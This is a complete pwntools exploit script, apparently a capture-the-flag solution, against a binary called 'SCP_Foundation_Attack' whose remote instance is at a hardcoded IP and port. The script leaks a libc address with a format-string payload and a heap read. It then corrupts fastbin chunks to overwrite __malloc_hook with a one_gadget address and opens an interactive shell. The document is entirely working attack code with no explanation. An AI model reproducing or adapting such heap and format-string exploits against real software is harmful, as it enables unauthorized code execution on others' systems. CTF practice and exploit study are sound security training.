#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./SCP_Foundation_Attack')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.106.94.13', 50006)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./SCP_Foundation_Attack', checksec=False)


p.sendlineafter('> Username:', '%2$p')
p.sendlineafter('> Password:', 'For_the_glory_of_Brunhild')


def view():
    p.sendlineafter('> Now please tell me what you want to do :', '1')
    p.recvuntil('# Your name is ')


def add(add_name_length, add_name, add_desc_length, add_desc):
    p.sendlineafter('> Now please tell me what you want to do :', '2')
    p.sendlineafter("> SCP name's length : ", str(add_name_length))
    p.sendafter('> SCP name : ', add_name)
    p.sendlineafter("> SCP description's length : ", str(add_desc_length))
    p.sendafter('> SCP description : ', add_desc)


def edit(edit_idx, edit_name, edit_desc):
    p.sendlineafter('> Now please tell me what you want to do :', '3')
    p.sendlineafter('> SCP project ID : ', str(edit_idx))
    p.sendlineafter('> SCP name : ', edit_name)
    p.sendlineafter('> SCP description : ', edit_desc)


def delete(delete_idx):
    p.sendlineafter('> Now please tell me what you want to do :', '4')
    p.sendlineafter('> SCP project ID : ', str(delete_idx))


def show():
    p.sendlineafter('> Now please tell me what you want to do :', '5')


libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
# gdb.attach(p, "b *$rebase(0xf3a)\nc")
add(0x60, 'a', 0x30, 'a')
add(0x60, 'a', 0x40, 'a')
delete(1)
delete(2)
add(0x30, 'a', 0x40, 'a')
view()
addr___free_hook = int(p.recv(14), 16) + 0x28
libcbase = addr___free_hook - libc.sym['__free_hook']
addr___malloc_hook = libcbase + libc.sym['__malloc_hook']
addr_one_gadget = libcbase + libc_one_gadget[3]
delete(1)
add(0x60, p64(addr___malloc_hook - 0x23), 0x60, 'a')
add(0x60, 'a', 0x60, 'a' * 0x13 + p64(addr_one_gadget))
p.sendlineafter('> Now please tell me what you want to do :', '2')
p.sendlineafter("> SCP name's length : ", '30')
success('addr___free_hook   = ' + hex(addr___free_hook))
success('addr___malloc_hook = ' + hex(addr___malloc_hook))
# gdb.attach(p)
p.interactive()
